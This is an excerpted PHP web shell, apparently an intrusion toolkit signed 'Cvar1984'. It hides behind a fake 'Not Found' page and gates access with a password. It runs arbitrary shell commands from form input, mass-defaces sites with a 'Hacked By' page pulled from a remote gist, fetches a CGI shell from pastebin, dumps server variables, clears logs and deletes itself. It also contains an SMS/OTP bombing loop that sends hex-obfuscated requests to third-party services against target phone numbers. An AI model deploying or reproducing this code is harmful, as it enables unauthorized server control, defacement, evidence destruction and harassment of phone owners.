...
<h1>Not Found</h1>
<p>The requested URL <?php echo $_SERVER[
    'PHP_SELF'
...
if (!isset($_SESSION[sha1(md5($_SERVER['HTTP_HOST']))])) {
    if (
        empty($auth_pass) or
        isset($_GET['pass']) and sha1($_GET['pass']) == $auth_pass
    ) {
...
if (isset($_POST['action'])) {
    ...
    foreach ($no as $on):
        ...
        post_data(
            "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x74\x6f\x6b\x6f\x63\x61\x73\x68\x2e\x63\x6f\x6d\x2f\x6f\x61\x75\x74\x68\x2f\x6f\x74\x70",
            "msisdn=" . $on . "&accept=call"
        );
    endforeach;
    for ($x = 0; $x < 100; $x++) {
        foreach ($no as $on):
            ...
            post_data(
                "\x68\x74\x74\x70\x3a\x2f\x2f\x73\x63\x2e\x6a\x64\x2e\x69\x64\x2f\x70\x68\x6f\x6e\x65\x2f\x73\x65\x6e\x64\x50\x68\x6f\x6e\x65\x53\x6d\x73",
                "phone=" . $on . "&smsType=1"
            );
            post_data(
                "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x70\x68\x64\x2e\x63\x6f\x2e\x69\x64\x2f\x65\x6e\x2f\x75\x73\x65\x72\x73\x2f\x73\x65\x6e\x64\x4f\x54\x50",
                "phone_number=" . $on
            );
        endforeach;
    }
...
function config()
{
    ...
    if (preg_match("/vhosts|vhost/", $dir)) {
        ...
        echo "<center><a href='?do=open&dir=" .
            getcwd() .
            $sep .
            $dir .
...
function mass_deface_main()
{
	...
	<tr>
		<td>
			<textarea style='height:350px;' type='text' class='form-control' id='textarea' name='script' ><?php echo file_get_contents(
       'https://gist.githubusercontent.com/Cvar1984/3bfdd8d2c09f8889440a9f74f6114a04/raw/899508d80ec7eba573bfb91af082586e26bf71e4/index.php'
   ); ?></textarea>
		</td>
	</tr>
	<tr>
...
<tr>
	<td>
		<textarea style="height:400px;" class="form-control" id="textarea" readonly /><?php var_dump(
      $_SERVER
  ); ?></textarea>
	</td>
</tr>
...
<form method="post">
		...
		<tr>
			...
			<tr>
				<td>
					<textarea style="height:350px;" name="text" class="form-control" id="textarea" cols="" rows=""><?php echo htmlspecialchars(
         $text
     ); ?></textarea>
				</td>
			</tr>
...
if (isset($_POST['command'])) { ?>
		<tr>
			<td>
				<textarea id="textarea" class="form-control" readonly><?php print @cmd(
        $_POST['command']
    ); ?></textarea>
			</td>
		</tr>
...
function renames($filename)
{
   ...
   <form method='post'>
		...
		<tr>
			<td>
				<input type='text' class='form-control' id='input' value='<?php echo @basename(
        $filename
    ); ?>' name='newname'>
			</td>
		</tr>
...
function cgi_shell()
{
    ...
    if ($os == 'Windows') {
        ...
        if (
            !(
                file_exists('.config/cgi.izo') and
            ...
            file_put_contents(
                '.config/cgi.izo',
                file_get_contents('https://pastebin.com/raw/MUD0EPjb')
            );
        }
...
function ngindex()
{
    if (isset($_POST['action'])) {
        ...
        $file = str_replace(
            '<title>Hacked By Cvar1984</title>',
            '<title>' . $_POST['title'] . '</title>',
            $file
        );
        $file = str_replace(
            'https://cvar1984.github.io/bg.mp3',
            $_POST['music'],
            $file
        );
        $file = str_replace('Just Joke :v', $_POST['alert'], $file);
        $file = str_replace(
            'https://minervagunceleri.files.wordpress.com/2014/08/logo.png',
            $_POST['images'],
            $file
        );
        $file = str_replace(
            '<h1>Hacked By Cvar1984</h1>',
            '<h1>' . $_POST['content'] . '</h1>',
            $file
        );
        $file = str_replace(
            '<h4>This Pain Is Wonderful</h4>',
            '<h4>' . $_POST['sub_content'] . '</h4>',
            $file
        );
...
function short_link()
{
    ...
    if (isset($_POST['action'])) {
        ...
        if (isset($json->error)) {
            ...
            echo "<center><textarea id='textarea' class='form-control' readonly>" .
                $json->id .
                "</textarea></center>";
            die();
        }
...
{
    clear_logs();
    unlink(@cwd() . $sep . $_SERVER['PHP_SELF'])
        ? alert("Backdoor removed")
        : alert("Permission Denied");
}
// END FUNCTION
...
<tr>
 ...
 foreach (scandir(@cwd()) as $dir) {
     ...
     $tools =
         "<center>
		<a class='btn btn-success btn-sm' href='?path=" .
         @cwd() .
         "&do=chmod&files=" .
         $dir .
         "'>Chmod</a>
